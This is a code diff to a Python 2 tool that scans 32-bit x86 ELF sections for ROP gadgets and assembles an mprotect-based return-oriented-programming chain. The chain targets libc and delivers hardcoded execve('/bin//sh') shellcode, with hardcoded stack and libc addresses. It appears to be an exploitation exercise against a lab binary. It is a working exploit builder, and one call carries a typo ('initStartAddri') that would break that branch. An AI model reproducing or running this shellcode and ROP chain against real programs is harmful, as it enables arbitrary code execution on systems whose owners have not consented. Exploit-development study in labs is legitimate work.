@@ -7,12 +7,13 @@ import subprocess
 import os
 import io
 
-gadget_map = {}
-unique_gadget_map = {}
-disassembled_map = {}
 register_list = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
+buf_address = 0xbfffeda8
+buf_len = 256
+packed_shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
-def find_gadgets(sectionData, startAddr):
+
+def find_gadgets(sectionData, startAddr, gadget_map, unique_gadget_map):
     retCount = sectionData.count("\xc3")
     if retCount == 0:
         return
@@ -66,6 +67,7 @@ def find_gadgets(sectionData, startAddr):
 
 
 def build_disassembled_gadgets_map(gadgetMap):
+    disassembled_map = {}
     md = Cs(CS_ARCH_X86, CS_MODE_32)
     md.detail = False 
 
@@ -73,6 +75,7 @@ def build_disassembled_gadgets_map(gadgetMap):
         gadget = gadgetMap[gadget_addr]
         instr_list = md.disasm(gadget, gadget_addr)
         disassembled_map[gadget_addr] = instr_list
+    return disassembled_map
 
 def print_gadgets(gadgetMap):
     md = Cs(CS_ARCH_X86, CS_MODE_32)
@@ -188,7 +191,11 @@ def pack_value(value):
     packed_value = struct.pack("<I", value)
     return packed_value
 
-def build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packed_shellcode):
+def build_rop_chain_libc(disassembled_map):
+    libc_base_address = 0xb7e05000
+    f = open("/lib/i386-linux-gnu/libc.so.6")
+    elffile = ELFFile(f)
+
     mprotect_offset = get_function_address(elffile, "mprotect")
     mprotect_addr = pack_value(libc_base_address + mprotect_offset)
 
@@ -254,6 +261,9 @@ def print_rop_payload(buf):
     print "#"*int(columns)
 
 def get_binary_instr(filename):
+    gadget_map = {}
+    unique_gadget_map = {}
+
     with open(filename, 'rb') as f:
         # read fbinary file 
         elffile = ELFFile(f)
@@ -262,39 +272,39 @@ def get_binary_instr(filename):
             textSec = elffile.get_section_by_name(b'.text')
             textStartAddr = textSec.header['sh_addr']
             textSection = textSec.data()
-            find_gadgets(textSection, textStartAddr)
+            find_gadgets(textSection, textStartAddr, gadget_map, unique_gadget_map)
         else:
             initSec = elffile.get_section_by_name(b'.init')
             initStartAddr = initSec.header['sh_addr']
             initSection = initSec.data()
-            find_gadgets(initSection, initStartAddr)
+            find_gadgets(initSection, initStartAddri, gadget_map, unique_gadget_map)
 
             pltSec = elffile.get_section_by_name(b'.plt')
             pltStartAddr = pltSec.header['sh_addr']
             pltSection = pltSec.data()
-            find_gadgets(pltSection, pltStartAddr)
+            find_gadgets(pltSection, pltStartAddr, gadget_map, unique_gadget_map)
 
             textSec = elffile.get_section_by_name(b'.text')
             textStartAddr = textSec.header['sh_addr']
             textSection = textSec.data()
-            find_gadgets(textSection, textStartAddr)
+            find_gadgets(textSection, textStartAddr, gadget_map, unique_gadget_map)
 
             finiSec = elffile.get_section_by_name(b'.fini')
             finiStartAddr = finiSec.header['sh_addr']
             finiSection = finiSec.data()
-            find_gadgets(finiSection, finiStartAddr)
+            find_gadgets(finiSection, finiStartAddr, gadget_map, unique_gadget_map)
 
-        build_disassembled_gadgets_map(unique_gadget_map)
+        disassembled_map = build_disassembled_gadgets_map(unique_gadget_map)
         print_gadgets(unique_gadget_map)
         print str(len(unique_gadget_map)) + " unique gadgets found." 
-        libc_base_address = 0xb7e0d000
-        buf_address = 0xbfffeda8
-        buf_len = 256
-        packed_shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
-        rop_payload = build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packed_shellcode)
-        print_rop_payload(rop_payload)
+        return disassembled_map
+    return None 
+
 
 #/lib/ld-linux.so.2
 #mprotect-shellcode/vuln2
 #/lib/i386-linux-gnu/libc.so.6
-get_binary_instr("/lib/i386-linux-gnu/libc.so.6")
+disas_map = get_binary_instr("/lib/i386-linux-gnu/libc.so.6")
+rop_payload = build_rop_chain_libc(disas_map)
+print_rop_payload(rop_payload)
+
